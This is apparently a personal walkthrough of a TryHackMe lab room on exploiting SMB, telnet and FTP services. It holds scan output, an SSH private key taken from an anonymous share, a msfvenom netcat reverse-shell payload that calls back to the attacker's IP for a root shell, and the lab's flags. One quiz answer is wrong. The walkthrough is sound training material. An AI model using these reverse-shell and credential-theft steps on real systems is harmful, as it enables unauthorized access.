
https://tryhackme.com/room/networkservices



## Get Connected

Hello and welcome!

This room will explore common Network Service vulnerabilities and misconfigurations, but in order to do that, we'll need to do a few things first!

A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you'll need some help with this, try completing the 'Linux Fundamentals' Module [(https://tryhackme.com/module/linux-fundamentals)](https://tryhackme.com/module/linux-fundamentals)

1. Connect to the TryHackMe OpenVPN Server (See [https://tryhackme.com/access](https://tryhackme.com/access) for help!)
2. Make sure you're sitting comfortably, and have a cup of Tea, Coffee or Water close!

Now, let's move on!  
  

**N.B.** This is not a room on WiFi access hacking or hijacking, rather how to gain unauthorized access to a machine by exploiting network services. If you are interested in WiFi hacking, I suggest checking out WiFi Hacking 101 by NinjaJc01 ([https://tryhackme.com/room/wifihacking101](https://tryhackme.com/room/wifihacking101))

## Understanding SMB

**What is SMB?**

SMB - Server Message Block Protocol - is a client-server communication protocol used for sharing access to files, printers, serial ports and other resources on a network. [[source](https://searchnetworking.techtarget.com/definition/Server-Message-Block-Protocol)]  

Servers make file systems and other resources (printers, named pipes, APIs) available to clients on the network. Client computers may have their own hard disks, but they also want access to the shared file systems and printers on the servers.

The SMB protocol is known as a response-request protocol, meaning that it transmits multiple messages between the client and server to establish a connection. Clients connect to servers using TCP/IP (actually NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI or IPX/SPX.

Once they have established a connection, clients can then send commands (SMBs) to the server that allow them to access shares, open files, read and write files, and generally do all the sort of things that you want to do with a file system. However, in the case of SMB, these things are done over the network.

**What runs SMB?**

Microsoft Windows operating systems since Windows 95 have included client and server SMB protocol support. Samba, an open source server that supports the SMB protocol, was released for Unix systems.

### What does SMB stand for?      
Server Message Block

### What type of protocol is SMB?      
response-request

### What protocol suite do clients use to connect to the server?
response-request

### What systems does Samba run on?
Unix

## Enumerating SMB

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.

This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.

**SMB**  

Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.  

**Port Scanning**

The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.  

If you haven't already looked at port scanning, I **recommend** checking out the Nmap room [here](https://tryhackme.com/room/furthernmap).

**Enum4Linux**

Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's already installed on the AttackBox, however if you need to install it on your own attacking machine, you can do so from the official [github](https://github.com/portcullislabs/enum4linux).

The syntax of Enum4Linux is nice and simple: **"enum4linux [options] ip"**  

**TAG**            **FUNCTION**  

-U             get userlist  
-M             get machine list  
-N             get namelist dump (different from -U and-M)  
-S             get sharelist  
-P             get password policy information  
-G             get group and member list

-a             all of the above (full basic enumeration)  

Now we understand our enumeration tools, let's get started!  

Answer the questions below

### Conduct an **nmap** scan of your choosing, How many ports are open?  
3

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ nmap -n -Pn --min-rate 1000 -p- -vv 10.10.31.167 -o nmap-smb
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-18 23:53 CDT
Initiating SYN Stealth Scan at 23:53
Scanning 10.10.31.167 [65535 ports]
Discovered open port 22/tcp on 10.10.31.167
Discovered open port 445/tcp on 10.10.31.167
Discovered open port 139/tcp on 10.10.31.167
SYN Stealth Scan Timing: About 43.39% done; ETC: 23:54 (0:00:40 remaining)
Increasing send delay for 10.10.31.167 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.31.167 from 5 to 10 due to max_successful_tryno increase to 5
Completed SYN Stealth Scan at 23:54, 74.51s elapsed (65535 total ports)
Nmap scan report for 10.10.31.167
Host is up, received user-set (0.19s latency).
Scanned at 2025-03-18 23:53:43 CDT for 74s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 61
139/tcp open  netbios-ssn  syn-ack ttl 61
445/tcp open  microsoft-ds syn-ack ttl 61

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 74.56 seconds
           Raw packets sent: 73876 (3.251MB) | Rcvd: 72853 (2.914MB)

```
### What ports is **SMB** running on? Provide the ports in ascending order.
139/445

### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the **workgroup** name?      
WORKGROUP

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ enum4linux 10.10.31.167 -a
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Mar 18 23:56:28 2025

 =========================================( Target Information )=========================================

Target ........... 10.10.31.167
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.31.167 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 10.10.31.167 )================================

Looking up status of 10.10.31.167
        POLOSMB         <00> -         B <ACTIVE>  Workstation Service
        POLOSMB         <03> -         B <ACTIVE>  Messenger Service
        POLOSMB         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.31.167 )===================================


[+] Server 10.10.31.167 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.31.167 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( OS information on 10.10.31.167 )===================================


[E] Can't get OS info with smbclient
                                                                                                     
                                                                                                     
[+] Got OS info for 10.10.31.167 from srvinfo:                                                       
        POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server (Samba, Ubuntu)                           
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 10.10.31.167 )=======================================                                                                                                  
                                                                                                     
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                              
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.31.167 )=================================                                                                                                  
                                                                                                     
                                                                                                     
        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            POLOSMB

[+] Attempting to map shares on 10.10.31.167                                                         
                                                                                                     
                                                                                                     
[E] Can't understand response:                                                                       
                                                                                                     
tree connect failed: NT_STATUS_BAD_NETWORK_NAME                                                      
//10.10.31.167/netlogon Mapping: N/A Listing: N/A Writing: N/A
//10.10.31.167/profiles Mapping: OK Listing: OK Writing: N/A
//10.10.31.167/print$   Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                       
                                                                                                     
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                           
//10.10.31.167/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 10.10.31.167 )============================                                                                                                 
                                                                                                     
                                                                                                     

[+] Attaching to 10.10.31.167 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] POLOSMB
        [+] Builtin

[+] Password Info for Domain: POLOSMB

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                 
                                                                                                     
                                                                                                     
Password Complexity: Disabled                                                                        
Minimum Password Length: 5


 =======================================( Groups on 10.10.31.167 )=======================================                                                                                                 
                                                                                                     
                                                                                                     
[+] Getting builtin groups:                                                                          
                                                                                                     
                                                                                                     
[+]  Getting builtin group memberships:                                                              
                                                                                                     
                                                                                                     
[+]  Getting local groups:                                                                           
                                                                                                     
                                                                                                     
[+]  Getting local group memberships:                                                                
                                                                                                     
                                                                                                     
[+]  Getting domain groups:                                                                          
                                                                                                     
                                                                                                     
[+]  Getting domain group memberships:                                                               
                                                                                                     
                                                                                                     
 ==================( Users on 10.10.31.167 via RID cycling (RIDS: 500-550,1000-1050) )==================                                                                                                  
                                                                                                     
                                                                                                     
[I] Found new SID:                                                                                   
S-1-22-1                                                                                             

[I] Found new SID:                                                                                   
S-1-5-32                                                                                             

[I] Found new SID:                                                                                   
S-1-5-32                                                                                             

[I] Found new SID:                                                                                   
S-1-5-32                                                                                             

[I] Found new SID:                                                                                   
S-1-5-32                                                                                             

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                          
                                                                                                     
S-1-22-1-1000 Unix User\cactus (Local User)                                                          

^C

```
### What comes up as the **name** of the machine?    
POLOSMB

### What operating system **version** is running?     
6.1

## What share sticks out as something we might want to investigate?
profiles


## Exploiting SMB

**Types of SMB Exploit  **

While there are vulnerabilities such as [CVE-2017-7494](https://www.cvedetails.com/cve/CVE-2017-7494/) that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.  

**Method Breakdown**

So, from our enumeration stage, we know:

    - The SMB share location

    - The name of an interesting SMB share  

**SMBClient**

Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it’s already installed on the AttackBox, if you do need to install it on your own attacking machine, you can find the documentation [here.](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)

We can remotely access the SMB share using the syntax:

`smbclient //[IP]/[SHARE]`

Followed by the tags:

-U [name] : to specify the user

-p [port] : to specify the port  

**Got it? Okay, let's do this!**  

Answer the questions below

### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?  
smbclient //10.10.10.2/secret -U suit -p 445


Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.  

Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:

- using the username "Anonymous"

- connecting to the share we found during the enumeration stage

- and not supplying a password.

```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ smbclient -L 10.10.31.167 
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        netlogon        Disk      Network Logon Service
        profiles        Disk      Users profiles
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (polosmb server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            POLOSMB

```
### Does the share allow anonymous access? Y/N?  
Y

Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?  

```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ smbclient //10.10.31.167/profiles 
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 21 06:08:23 2020
  ..                                  D        0  Tue Apr 21 05:49:56 2020
  .cache                             DH        0  Tue Apr 21 06:08:23 2020
  .profile                            H      807  Tue Apr 21 06:08:23 2020
  .sudo_as_admin_successful           H        0  Tue Apr 21 06:08:23 2020
  .bash_logout                        H      220  Tue Apr 21 06:08:23 2020
  .viminfo                            H      947  Tue Apr 21 06:08:23 2020
  Working From Home Information.txt      N      358  Tue Apr 21 06:08:23 2020
  .ssh                               DH        0  Tue Apr 21 06:08:23 2020
  .bashrc                             H     3771  Tue Apr 21 06:08:23 2020
  .gnupg                             DH        0  Tue Apr 21 06:08:23 2020

                12316808 blocks of size 1024. 7583756 blocks available
smb: \> get "Working From Home Information.txt"
getting file \Working From Home Information.txt of size 358 as Working From Home Information.txt (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
smb: \> bye
bye: command not found
smb: \> exit

```
### What service has been configured to allow him to work from home?  
ssh

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ cat Working\ From\ Home\ Information.txt 
John Cactus,

As you're well aware, due to the current pandemic most of POLO inc. has insisted that, wherever 
possible, employees should work from home. As such- your account has now been enabled with ssh
access to the main server.

If there are any problems, please contact the IT department at it@polointernalcoms.uk

Regards,

James
Department Manager 


```

### Okay! Now we know this, what directory on the share should we look in?  
.ssh


### This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?  
id_rsa

```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ smbclient //10.10.31.167/profiles       
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> cd .ssh
smb: \.ssh\> ls
  .                                   D        0  Tue Apr 21 06:08:23 2020
  ..                                  D        0  Tue Apr 21 06:08:23 2020
  id_rsa                              A     1679  Tue Apr 21 06:08:23 2020
  id_rsa.pub                          N      396  Tue Apr 21 06:08:23 2020
  authorized_keys                     N        0  Tue Apr 21 06:08:23 2020

                12316808 blocks of size 1024. 7583456 blocks available
smb: \.ssh\> get id_rsa
getting file \.ssh\id_rsa of size 1679 as id_rsa (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
smb: \.ssh\> exit

```

### Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]".

Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ ls                                      
 id_rsa   nmap-smb  'Working From Home Information.txt'
                                                                                                     
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ chmod 600 id_rsa       
```

### What is the smb.txt flag?
- ssh como user `cactus`
- lo supimos viendo su llave publica `id_rsa.pub`
```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ ssh -i id_rsa cactus@10.10.31.167
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-96-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Mar 19 05:07:53 UTC 2025

  System load:  0.0                Processes:           92
  Usage of /:   33.3% of 11.75GB   Users logged in:     0
  Memory usage: 17%                IP address for eth0: 10.10.31.167
  Swap usage:   0%


22 packages can be updated.
0 updates are security updates.


Last login: Tue Apr 21 11:19:15 2020 from 192.168.1.110
cactus@polosmb:~$ 

cactus@polosmb:~$ ls
smb.txt
cactus@polosmb:~$ cat smb.txt 
THM{smb_is_fun_eh?}
cactus@polosmb:~$ 

```

## Understanding Telnet

**What is Telnet?**

Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.  

The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.  

**Replacement**  

Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.  
   
****How does Telnet work?****

The user connects to the server by using the Telnet protocol, which means entering **"telnet"** into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: **"telnet [ip] [port]"**

Answer the questions below

### What is Telnet?      
application protocol

### What has slowly replaced Telnet?   
ssh

### How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?  
telnet 10.10.10.3 23


### The lack of what, means that all Telnet communication is in plaintext?
encryption


## Enumerating Telnet



**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 

**Port Scanning**

Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with **nmap.**  

**Output**

Let's see what's going on on the target server...  
  

Answer the questions below

### How many **ports** are open on the target machine?    
1

### What **port** is this?  
8012

## This port is unassigned, but still lists the **protocol** it's using, what protocol is this?       
telnet

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ nmap -n -Pn --min-rate 1000 -p- -vv 10.10.208.209 -o nmap-telnet -sV
Warning: The -o option is deprecated. Please use -oN
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 00:14 CDT
NSE: Loaded 47 scripts for scanning.
Initiating SYN Stealth Scan at 00:14
Scanning 10.10.208.209 [65535 ports]
Increasing send delay for 10.10.208.209 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.208.209 from 5 to 10 due to max_successful_tryno increase to 5
SYN Stealth Scan Timing: About 41.25% done; ETC: 00:16 (0:00:44 remaining)
Discovered open port 8012/tcp on 10.10.208.209
Discovered open port 8012/tcp on 10.10.208.209
Increasing send delay for 10.10.208.209 from 10 to 20 due to max_successful_tryno increase to 6
Completed SYN Stealth Scan at 00:16, 73.55s elapsed (65535 total ports)
Initiating Service scan at 00:16
Scanning 1 service on 10.10.208.209
Stats: 0:02:29 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:03:03 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Completed Service scan at 00:18, 161.39s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.208.209.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:18
Completed NSE at 00:18, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:18
Completed NSE at 00:18, 1.19s elapsed
Nmap scan report for 10.10.208.209
Host is up, received user-set (0.18s latency).
Scanned at 2025-03-19 00:14:59 CDT for 236s
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
8012/tcp open  unknown syn-ack ttl 61
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8012-TCP:V=7.95%I=7%D=3/19%Time=67DA5323%P=aarch64-unknown-linux-gn
SF:u%r(NULL,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20c
SF:ommands\n")%r(GenericLines,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\
SF:x20to\x20view\x20commands\n")%r(GetRequest,2E,"SKIDY'S\x20BACKDOOR\.\x2
SF:0Type\x20\.HELP\x20to\x20view\x20commands\n")%r(HTTPOptions,2E,"SKIDY'S
SF:\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20commands\n")%r(RTSPRe
SF:quest,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x20view\x20comm
SF:ands\n")%r(RPCCheck,2E,"SKIDY'S\x20BACKDOOR\.\x20Type\x20\.HELP\x20to\x
SF:20view\x20commands\n");

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 236.29 seconds
           Raw packets sent: 73122 (3.217MB) | Rcvd: 73271 (2.931MB)

```
### Now re-run the **nmap** scan, without the **-p-** tag, how many ports show up as open?  
0
```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ nmap -n -Pn --min-rate 1000 -vv 10.10.208.209 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 00:15 CDT
Initiating SYN Stealth Scan at 00:15
Scanning 10.10.208.209 [1000 ports]
Completed SYN Stealth Scan at 00:15, 1.47s elapsed (1000 total ports)
Nmap scan report for 10.10.208.209
Host is up, received user-set (0.19s latency).
Scanned at 2025-03-19 00:15:33 CDT for 1s
All 1000 scanned ports on 10.10.208.209 are in ignored states.
Not shown: 1000 closed tcp ports (reset)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
           Raw packets sent: 1116 (49.104KB) | Rcvd: 2566 (102.640KB)

```

Here, we see that by assigning telnet to a **non-standard port**, it is not part of the common ports list, or top 1000 ports, that nmap scans. It's important to try every angle when enumerating, as the information you gather here will inform your exploitation stage.  

### Based on the title returned to us, what do we think this port could be **used for**?  
backdoor

```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ telnet 10.10.208.209 8012
Trying 10.10.208.209...
Connected to 10.10.208.209.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands


```

### Who could it belong to? Gathering possible **usernames** is an important step in enumeration.  
skidy

Always keep a note of information you find during your enumeration stage, so you can refer back to it when you move on to try exploits.

## Exploiting Telnet


**Types of Telnet Exploit  **

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)[](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

**Method Breakdown**

So, from our enumeration stage, we know:

    - There is a poorly hidden telnet service running on this machine
    - The service itself is marked "backdoor"
    - We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

**Connecting to Telnet**

You can connect to a telnet server with the following syntax:

    **"telnet [ip] [port]"**

We're going to need to keep this in mind as we try and exploit this machine.

**What is a Reverse Shell?**

A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

Answer the questions below

Okay, let's try and connect to this telnet port! If you get stuck, have a look at the syntax for connecting outlined above.  

### Great! It's an open telnet connection! What welcome message do we receive?  

- Lanzamos pings
```
──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ telnet 10.10.208.209 8012
Trying 10.10.208.209...
Connected to 10.10.208.209.
Escape character is '^]'.
SKIDY'S BACKDOOR. Type .HELP to view commands
.HELP
.HELP: View commands
 .RUN <command>: Execute commands
.EXIT: Exit
.RUN ping -c3 10.13.81.73                                                                                                                                                                                     
                        
```

Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)  

Hmm... that's strange. Let's check to see if what we're typing is being executed as a system command.  

Start a tcpdump listener on your local machine.

**If using your own machine with the OpenVPN connection, use:**  

- `sudo tcpdump ip proto \\icmp -i tun0`

**If using the AttackBox, use:**

- `sudo tcpdump ip proto \\icmp -i ens5`

This starts a tcpdump listener, specifically listening for ICMP traffic, which pings operate on.  

Now, use the command **"ping [local THM ip] -c 1"** through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)  

Great! This means that we are able to execute system commands AND that we are able to reach our local machine. Now let's have some fun!  


- Escuchamos pings

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ sudo tcpdump -i tun0 icmp                       
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:21:34.008370 IP 10.10.208.209 > 10.13.81.73: ICMP echo request, id 1231, seq 1, length 64
00:21:34.008382 IP 10.13.81.73 > 10.10.208.209: ICMP echo reply, id 1231, seq 1, length 64
00:21:35.091621 IP 10.10.208.209 > 10.13.81.73: ICMP echo request, id 1231, seq 2, length 64
00:21:35.091635 IP 10.13.81.73 > 10.10.208.209: ICMP echo reply, id 1231, seq 2, length 64
00:21:36.012669 IP 10.10.208.209 > 10.13.81.73: ICMP echo request, id 1231, seq 3, length 64
00:21:36.012698 IP 10.13.81.73 > 10.10.208.209: ICMP echo reply, id 1231, seq 3, length 64


```



We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format  

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ msfvenom -p cmd/unix/reverse_netcat lhost=10.13.81.73 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes
mkfifo /tmp/oseee; nc 10.13.81.73 4444 0</tmp/oseee | /bin/sh >/tmp/oseee 2>&1; rm /tmp/oseee

```

### What word does the generated payload start with?  
mkfifo
  

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**

```
┌──(kali㉿vbox)-[~/tmp/tryhackme/networkservices]
└─$ nc -lvnp 4444                                                       
listening on [any] 4444 ...
connect to [10.13.81.73] from (UNKNOWN) [10.10.208.209] 60286
id
uid=0(root) gid=0(root) groups=0(root)
ls
flag.txt
cat flag.txr
cat: flag.txr: No such file or directory
cat flag.txt
THM{y0u_g0t_th3_t3ln3t_fl4g}


```


### What would the command look like for the listening port we selected in our payload?  
  nc -lvnp 4444

Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!  

### Success! What is the contents of flag.txt?
THM{y0u_g0t_th3_t3ln3t_fl4g}



## Understanding FTP

**What is FTP?**

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.  

****How does FTP work?****

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel
- a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.  

**Active vs Passive**

The FTP server may support either Active or Passive connections, or both. 

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

**More Details:**

You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: [https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt). The IETF is one of a number of standards agencies, who define and regulate internet standards.  
  

Answer the questions below

### What communications model does FTP use?  
cliente-server

### What's the standard FTP port?  

21

### How many modes of FTP connection are there?

2


## Enumerating FTP

**Lets Get Started**

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

**Enumeration**

By now, I don't think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with **nmap** to be able to port scan effectively. If you get stuck using any tool- you can always use **"tool [-h / -help / --help]"** to find out more about it's function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using **"man [tool]"**.

**Method**

We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.

**Resources**

As we're going to be logging in to an FTP server, we will need to make sure an FTP client is installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing "ftp" into the console. If you're brought to a prompt that says: "ftp>", then you have a working FTP client on your system. If not, it's a simple matter of using "sudo apt install ftp" to install one.  

**Alternative Enumeration Methods**

It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the "cwd" command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.  

This vulnerability is documented at: [https://www.exploit-db.com/exploits/20745](https://www.exploit-db.com/exploits/20745)


Now we understand our toolbox, let's do this.                   

Answer the questions below

Run an **nmap** scan of your choice.

### How many **ports** are open on the target machine?   

 1

### What **port** is ftp running on?  

21

### What **variant** of FTP is running on it?  

 vsftpd

Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "_ftp [IP]_" into the console, and entering "anonymous", and no password when prompted.

### What is the name of the file in the anonymous FTP directory?  

  PUBLIC_NOTICE.txt

### What do we think a possible username  could be?  

